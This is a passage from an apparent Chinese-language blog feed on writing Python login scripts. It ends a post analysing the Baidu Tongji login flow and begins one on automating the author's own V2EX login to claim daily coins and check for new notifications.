class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</div><div class="line">&lt;meta http-equiv=&quot;ReFresh&quot; content=&quot;0; url=https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132&quot; /&gt;</div><div class="line">&lt;title&gt;正在处理...&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;script&gt;                </div><div class="line">    var url=&quot;https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132&quot;;</div><div class="line">    location.href=url;</div><div class="line">    &lt;/script&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure> <p>然后浏览器加载该url，显示错误提示信息</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Request URL:https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132</div><div class="line">Request Method:GET</div><div class="line"></div><div class="line">fromu:https://tongji.baidu.com/web/welcome/loginback</div><div class="line">e:用户名密码错误</div><div class="line">un:anhkgg</div><div class="line">aid:12</div><div class="line">errno:132</div></pre></td></tr></table></figure> <p>其中<code>e</code>是错误提示信息，errno是错误号。</p> <p>登录成功返回数据如下，没有<code>e</code>错误信息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;                </div><div class="line">var url=&quot;http://cas.baidu.com/?action=check&amp;appid=12&amp;u=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback%3Fcastk%3Dc4086gh7e82166251d451&amp;fromLogin=1&quot;;</div><div class="line">location.href=url;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure> <p>那么就可以先通过正则拿到url，通过搜索url是否有<code>e</code>判断是否登录成功，并且拿到提示信息。成功则继续访问该url跳转到成功页面，获取其他需要的信息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">pattern = re.compile(r&apos;var url=&quot;(.*?)&quot;;&apos;)</div><div class="line">cont = re.search(pattern, r.content)</div><div class="line">url = cont.group(1)</div><div class="line">pattern = re.compile(r&apos;e=(.*?)&amp;un=&apos;)</div><div class="line">cont = re.search(pattern, url)</div><div class="line">if cont != None:</div><div class="line">    r = urllib.unquote(cont.group(1)) #失败</div><div class="line">    return utf2gbk(r)        </div><div class="line"></div><div class="line">r = self.s.get(url) # 成功</div></pre></td></tr></table></figure> <h1 id="js模板"><a href="#js模板" class="headerlink" title="js模板"></a>js模板</h1><p>这里比较意思的是使用的js模板来生成登录表单。</p> <p>具体js模板使用看<a href="http://freshflower.iteye.com/blog/2120268" target="_blank" rel="external">这里</a>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">&lt;script id=&quot;LoginTemplate&quot; type=&quot;text/template&quot;&gt;</div><div class="line"></div><div class="line">    &lt;div id=&quot;LoginContainer&quot; class=&quot;login-dialog&quot;&gt;</div><div class="line">        &lt;div id=&quot;TopTmp&quot;&gt;&amp;nbsp;&lt;/div&gt;</div><div class="line"></div><div class="line">        if (this.isIco == 1) &#123;</div><div class="line">        &lt;div id=&quot;LoginMain&quot; class=&quot;ico-login clearfix&quot;&gt;</div><div class="line">            &lt;div class=&quot;visitor-login-tab&quot; id=&quot;LoginTab&quot;&gt;请输入查看密码&lt;/div&gt;</div><div class="line">            &lt;div id=&quot;LoginInput&quot; class=&quot;login-input&quot;&gt;</div><div class="line">                if (this.errMsg) &#123;</div><div class="line">                &lt;div id=&quot;ErrorTip&quot; class=&quot;error&quot;&gt;#&#123;this.errMsg&#125;&lt;/div&gt;</div><div class="line">                &#125;</div><div class="line">                ...</div><div class="line">            &lt;/div&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">        &lt;div id=&quot;LoginMain&quot; class=&quot;login-main&quot;&gt;</div><div class="line">            </div><div class="line">                &lt;form method=&quot;post&quot; action=&quot;#&#123;this.loginAction&#125;&quot;&gt;</div><div class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;12&quot; id=&quot;Appid&quot; name=&quot;appid&quot;&gt;</div><div class="line">                    ...</div><div class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;#&#123;this.selfUrl&#125;&quot; name=&quot;selfu&quot; /&gt;</div><div class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;1&quot; name=&quot;senderr&quot; /&gt;</div><div class="line">                &lt;/form&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">        &#125;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;div class=&quot;dialog-bottom-bg&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure> <p>从上面代码中可以看到，某些标签的值使用了<code>#{this.xxx}</code>这样的语法，不是直接填入的具体内容，更加灵活，扩展更容易。</p> <p>然后在点击登录按钮之后，通过函数格式化一个全局定义的变量来生成的登录表单。具体如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">//全局数据，用于替换表单中的this.xxx</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">VAR = &#123;</div><div class="line">    webMasterRegister: &quot;https://tongji.baidu.com/web/register&quot;,</div><div class="line">    customRegister: &quot;https://u.baidu.com/ucweb/?module=Reguser&amp;controller=reg&amp;action=index&amp;appid=3&quot;,</div><div class="line">    union_forget: &quot;http://union.baidu.com/findPassword!input.action&quot;,</div><div class="line">    shifen_forget: &quot;https://aq.baidu.com/new/#/findpwd&quot;,</div><div class="line">    uc_forget: &quot;https://aq.baidu.com/new/#/findpwd&quot;,</div><div class="line">    waiting_img_src: &quot;/web/img/loadingImage.gif&quot;,</div><div class="line">    app_id: &quot;0&quot;,</div><div class="line">    errMsg: &quot;&quot;,</div><div class="line">    loginUrl: &quot;/web/welcome/login&quot;,</div><div class="line">    loginAction: &quot;https://cas.baidu.com/?action=login&quot;,</div><div class="line">    userName: &quot;&quot;,</div><div class="line">    authCode: &quot;https://cas.baidu.com/?action=image&amp;key=1503151305&quot;,</div><div class="line">    registerUrl: &quot;/web/register&quot;,</div><div class="line">    fromUrl: &quot;https://tongji.baidu.com/web/welcome/loginback&quot;,</div><div class="line">    selfUrl: &quot;https://tongji.baidu.com/web/welcome/login&quot;,</div><div class="line">    isIco: &quot;0&quot;,</div><div class="line">    webmasterUserNum: &quot;2097176&quot;,</div><div class="line">    customerUserNum: &quot;2270927&quot;,</div><div class="line">    mtjUserNum: &quot;2262130&quot;</div><div class="line">&#125;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure> <p>然后在login.js中，通过下面的函数来初始化表单，并且显示。</p> <p>其中<code>n.format(&quot;LoginTemplate&quot;, VAR)</code>用于格式化VAR定义的数据到表单的数据中。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">, h = function() &#123;</div><div class="line">    var e = t(&quot;.login-trigger&quot;).eq(0);</div><div class="line">    e.on(&quot;click&quot;, function() &#123;</div><div class="line">        s || (s = new i(&#123;</div><div class="line">            width: 345,</div><div class="line">            isModal: !0,</div><div class="line">            titleText: &quot;&quot;,</div><div class="line">            isSingle: !0,</div><div class="line">            content: n.format(&quot;LoginTemplate&quot;, VAR) //初始化登录表单数据</div><div class="line">        &#125;),</div><div class="line">        loginController.init()),</div><div class="line">        s.show()</div><div class="line">    &#125;);</div></pre></td></tr></table></figure> <p>而在format具体如何替换的，就随意实现了，这里就不在具体分析，有兴趣跟着分析的同学可以去看看common.js中的代码。</p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>百度统计接口非常简单，密码未做变换，使用https。</p> <p>登录之后具体做什么也不在分析。</p> <p>预告下次做百度主站的登录分析，简单看了下，非常…复杂！</p> <p>安利一下公众号：汉客儿</p> <p><img src="/img/wechat_public.png" alt="img"></p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-baidutongji-login-analyze/">https://anhkgg.github.io/pylogin-baidutongji-login-analyze/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;这次分析的百度统计登录接口，算是这几个中最简单的了。&lt;/p&gt; &lt;p&gt;但是学到了一个新东西，叫做js模板，搞web的同学应该知道，我这种web半吊子第一次见，非常有意思。&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="v2ex" scheme="https://anhkgg.github.io/tags/v2ex/"/>            <category term="自动领币" scheme="https://anhkgg.github.io/tags/%E8%87%AA%E5%8A%A8%E9%A2%86%E5%B8%81/"/>        </entry>      <entry>     <title>pylogin系列之V2EX自动领币消息提醒</title>     <link href="https://anhkgg.github.io/pylogin-v2ex-login-analyze/"/>     <id>https://anhkgg.github.io/pylogin-v2ex-login-analyze/</id>     <published>2017-08-18T13:09:58.000Z</published>     <updated>2017-08-22T05:31:40.082Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近开始混v2ex，v2ex发主题、回复都要收钱，发帖收钱还跟字数相关，之前不知道这些，发个帖子内容太多，kao，没钱了！</p> <p>虽然主题有人回复会收到钱，但是也没人回复啊，也不知道v2ex大佬们喜欢什么内容！</p> <p>幸好v2ex有个登录领币任务，每天还可以攒点钱，但是有些时候会忘啊，怎么办？…</p> <p>嗯，程序员嘛，偷懒的办法多…这就开始分析接口，自动领币！</p> <a id="more"></a> <p>然后呢，发个主题，总想看看有没有大佬关注和回复，然后就时不时打开浏览器，去刷新一下页面。</p> <p>就跟大部分用windows的人一样，回到桌面不右键+E（刷新）一下，就感觉人生好像少了什么东西（我好像是重症患者，用ubuntu也要找一下刷新桌面）！</p> <p>这种情况是不是病啊？！</p> <p>然后呢，刷新很浪费时间诶，有人回复，看着还算开心嘛，但也没人回复，那不白浪费时间了嘛，还影响期待的小心情！</p> <p>所以呢，还得加上自动消息提醒功能！</p> <p>废话完毕，开始干活！</p> <p>工具：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. chrome/firefox</div><div class="line">2. f12，network</div><div class="line">3. python：requests、re</div></pre></td></tr></table></figure> <h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><p>开始分析登录接口。打开chrome，f12，进入登录页面。只需要输入名字和密码，没有验证码，真好！</p> <p>访问的链接是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.v2ex.com/signin</div></pre></td></tr></table></figure> <p>然后随便输入什么名字和密码，点击登录，肯定失败，页面有提示。再看网络请求数据：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">POST https://www.v2ex.com/signin</div><div class="line">Host: www.v2ex.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) </div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line"></div><div class="line">//发送数据</div><div class="line">6b79e5fdb638c190396648c486c313dca73ad9f6e4e122fafc356e54522eedc4:&quot;111111111111111&quot; //name</div><div class="line">bb4419eb55aef4106a853ce9f4642d5d58ac021f4e1fef29a230e2352da74802:&quot;11111111111&quot; //password</div><div class="line">once:&quot;95083&quot;</div><div class="line">next:&quot;/&quot;</div><div class="line"></div><div class="line"></div><div class="line">//登录错误</div><div class="line">&lt;div class=&quot;box&quot;&gt;</div><div class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</div><div class="line">    &lt;div class=&quot;problem&quot;&gt;请解决以下问题然后再提交：&lt;ul&gt;&lt;li&gt;用户名和密码无法匹配&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</div><div class="line">    </div><div class="line">    ...</div><div class="line">    </div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure> <p>这个请求关键点:</p> <ol> <li>POST请求，url是<code>https://www.v2ex.com/signin</code></li> <li>发送数据有名字和明文密码，以及两个其他不明字段</li> <li>请求是https，所以明文密码不会暴露。</li> </ol> <p>在仔细看发送的4个数据。<br>名字和密码对应的字段都是一长串字符，猜想这个是变化的，每次刷新登录页面都不一样，多次尝试下确认该猜想！</p> <p>如何获取呢，肯定是在打开登录页面时就会收到服务器返回的这两个字符串的。在登录html内容中一翻，看到如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;div class=&quot;box&quot;&gt;</div><div class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</div><div class="line">    &lt;div class=&quot;cell&quot;&gt;</div><div class="line">        &lt;form method=&quot;post&quot; action=&quot;/signin&quot;&gt;</div><div class="line">        &lt;table cellpadding=&quot;5&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; width=&quot;100%&quot;&gt;</div><div class="line">            &lt;tr&gt;</div><div class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;用户名&lt;/td&gt;</div><div class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;804c76d3f1472cdd8721d16f21de446186f2bae893748542ffda39963ff293f4&quot; value=&quot;111111111111111&quot; autofocus=&quot;autofocus&quot; autocorrect=&quot;off&quot; spellcheck=&quot;false&quot; autocapitalize=&quot;off&quot; placeholder=&quot;用户名或电子邮箱地址&quot; /&gt;&lt;/td&gt;</div><div class="line">            &lt;/tr&gt;</div><div class="line">            &lt;tr&gt;</div><div class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;密码&lt;/td&gt;</div><div class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;359a3968b3b6f37b05fceed766bd8995090a4fd5cdc74ba0a8cd17b44d2bc86e&quot; value=&quot;&quot; autocorrect=&quot;off&quot; spellcheck=&quot;false&quot; autocapitalize=&quot;off&quot; /&gt;&lt;/td&gt;</div><div class="line">            &lt;/tr&gt;</div><div class="line">            &lt;tr&gt;</div><div class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;&lt;/td&gt;</div><div class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;hidden&quot; value=&quot;79599&quot; name=&quot;once&quot; /&gt;&lt;input type=&quot;submit&quot; class=&quot;super normal button&quot; value=&quot;登录&quot; /&gt;&lt;/td&gt;</div><div class="line">            &lt;/tr&gt;</div><div class="line">            &lt;tr&gt;</div><div class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;&lt;/td&gt;</div><div class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;a href=&quot;/forgot&quot;&gt;我忘记密码了&lt;/a&gt;&lt;/td&gt;</div><div class="line">            &lt;/tr&gt;</div><div class="line">        &lt;/table&gt;</div><div class="line">        &lt;input type=&quot;hidden&quot; value=&quot;/&quot; name=&quot;next&quot; /&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure> <p>名字对应字段是<code>&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;804c76d3f1472cdd8721d16f21de446186f2bae893748542ffda39963ff293f4&quot;</code>，</p> <p>密码对应字段是<code>&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;359a3968b3b6f37b05fceed766bd8995090a4fd5cdc74ba0a8cd17b44d2bc86e&quot;</code>，</p> <p>可以通过正则获取到字段名。</p> <p>名字正则：<code>r&#39;&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;([\d\w]*?)&quot;&#39;</code></p> <p>密码正则：<code>r&#39;&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;([\d\w]*?)&quot;&#39;</code></p> <p>也看到了其他两个数据字段，<code>&lt;input type=&quot;hidden&quot; value=&quot;79599&quot; name=&quot;once&quot; /&gt;</code> 和 <code>&lt;input type=&quot;hidden&quot; value=&quot;/&quot; name=&quot;next&quot; /&gt;</code>。</p> <p><code>once</code>对应的值每次都不一样，<code>next</code>的值应该是固定的<code>/</code>，但是为了保险，都通过正则来获取</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">r&apos;&lt;input type=&quot;hidden&quot; value=&quot;([\d\w]+?)&quot; name=&quot;once&quot; /&gt;&apos;</div><div class="line">r&apos;&lt;input type=&quot;hidden&quot; value=&quot;(.+?)&quot; name=&quot;next&quot; /&gt;&apos;</div></pre></td></tr></table></figure> <p>好了，到此登录请求需要的东西都分析完了，然后就是模拟接口发送请求了。</p> <p>忘了还有一点，返回状态的判断。</p> <p>前面看到登录错误的有提示信息，为了更人性化，把这个信息拿到吧。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//登录错误</div><div class="line">&lt;div class=&quot;box&quot;&gt;</div><div class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</div><div class="line">    &lt;div class=&quot;problem&quot;&gt;请解决以下问题然后再提交：&lt;ul&gt;&lt;li&gt;用户名和密码无法匹配&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</div></pre></td></tr></table></figure> <p>获取错误信息正则是这样：<code>r&#39;&lt;div class=&quot;problem&quot;&gt;.+?&lt;ul&gt;&lt;li&gt;(.*?)&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&#39;</code></p> <p>登录成功判断待会儿再分析。</p> <p>通过py发送模拟登陆请求，代码如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">payload = &#123;</div><div class="line">                self.form_name:name,</div><div class="line">                self.form_pass:pwd,</div><div class="line">                &apos;once&apos;: self.form_once,</div><div class="line">                &apos;next&apos;: self.form_next</div><div class="line">                &#125;</div><div class="line">r = self.s.post(url, data=payload, headers=headers)</div></pre></td></tr></table></figure> <p>保存了返回数据一看，没成功啊，还是未登录的首页。</p> <p>重新再浏览器登录一下，仔细分析了一下。</p> <p>发送了登录请求之后，登录成功之后，页面自动跳转到<code>https://www.v2ex.com</code>，有登录信息了。</p> <p>猜测对请求的头部数据做了某些校验。</p> <p>看看请求的头部数据，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Host: www.v2ex.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) ...</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate, br</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 167</div><div class="line">Referer: https://www.v2ex.com/signin</div><div class="line">Connection: keep-alive</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure> <p>一般来说可能会对host，referer等字段检查，加入尝试一下。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">headers = &#123;</div><div class="line">    #&apos;Host&apos;: &apos;www.v2ex.com&apos;,</div><div class="line">    #&apos;origin&apos;:&apos;https://www.v2ex.com&apos;,</div><div class="line">    &apos;referer&apos;:&apos;https://www.v2ex.com/signin&apos;,                </div><div class="line">    &#125;</div></pre></td></tr></table></figure> <p>成功登录，屏蔽其中一些字段，发现只需要加入referer即可登录。</p> <p>获取登录成功状态，可以看到登录成功后，会有用户账户信息，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;/member/anhkgg&quot; class=&quot;top&quot;&gt;anhkgg&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</div><div class="line">&lt;a href=&quot;https://workspace.v2ex.com/&quot; target=&quot;_blank&quot; class=&quot;top&quot;&gt;工作空间&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</div><div class="line">&lt;a href=&quot;/notes&quot; class=&quot;top&quot;&gt;记事本&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;/t&quot; class=&quot;top&quot;&gt;时间轴&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;/settings&quot; class=&quot;top&quot;&gt;设置&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</div><div class="line">&lt;a href=&quot;#;&quot; onclick=&quot;if (confirm(&apos;确定要从 V2EX 登出？&apos;)) &#123; location.href= &apos;/signout?once=54090&apos;; &#125;&quot; class=&quot;top&quot;&gt;登出&lt;/a&gt;&lt;/td&gt;</div></pre></td></tr></table></figure> <p>那么只需要搜索是否存在<code>&lt;a href=&quot;/member/anhkgg&quot;</code>即可。正则表达式是：<code>r&#39;&lt;a href=&quot;/member/.+?&quot;&gt;&#39;</code>。找到该内容表示登录成功。</p> <h1 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h1><p>登录成功了，顺便看一下退出的接口。抓包看一下，发现访问了如下链接：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.v2ex.com/signout?once=71351</div></pre></td></tr></table></figure> <p>又见到once字段，值又是每次不同的。那么也只有动态获取一下了。在前面登录成功的信息中其实可以看到有退出接口的内容。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">onclick=&quot;if (confirm(&apos;确定要从 V2EX 登出？&apos;)) &#123; location.href= &apos;/signout?once=54090&apos;; &#125;&quot; class=&quot;top&quot;&gt;登出&lt;/a&gt;&lt;/td&gt;</div></pre></td></tr></table></figure> <p>通过正则获取一下once：<code>r&quot;location.href= &#39;/signout\?once=([\d\w]+?)&#39;&quot;</code>，然后模拟退出。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url = &apos;https://www.v2ex.com/signout&apos;</div><div class="line">payload = &#123; &apos;once&apos;: self.signout_once&#125;</div><div class="line">self.s.get(url, params=payload)</div></pre></td></tr></table></figure> <h1 id="新评论"><a href="#新评论" class="headerlink" title="新评论"></a>新评论</h1><p>接着就看看我需要的功能了。</p> <p>首先是获取最新评论条数。找到对应html的内容，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/a&gt;&lt;/div&gt;&lt;a href=&quot;/notifications&quot; class=&quot;fade&quot;&gt;0 条未读提醒&lt;/a&gt;&lt;/div&gt;</div></pre></td></tr></table></figure> <p>非常简单，关键字notifications，正则一搜即可拿到。</p> <p><code>r&#39;&lt;a href=&quot;/notifications&quot;.*?&gt;(\d+)(.*?)&lt;/a&gt;&#39;</code></p> <p>不在细说。</p> <p>为了能主动提醒我是否有最新消息，登录成功后，没10分钟刷新一下<code>https://www.v2ex.com</code>，再获取评论条数即可。</p> <p>有新评论就通知我。</p> <h1 id="领取每日奖励"><a href="#领取每日奖励" class="headerlink" title="领取每日奖励"></a>领取每日奖励</h1><p>嗯，钱的事还是挺重要的。</p> <p>首页右侧，每天会出现领取今日奖励的按钮，什么时候出现不知道（过了凌晨12点？），点击后跳转到领取页面，再点击领取按钮就拿到钱了！</p> <p>第一步，拿到领取页面的链接。看下面，是固定的，终于省了一点点事。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div class=&quot;box&quot;&gt;&lt;div class=&quot;inner&quot;&gt;&lt;li class=&quot;fa fa-gift&quot; style=&quot;color: #f90;&quot;&gt;&lt;/li&gt; &amp;nbsp;&lt;a href=&quot;/mission/daily&quot;&gt;领取今日的登录奖励&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;</div></pre></td></tr></table></figure> 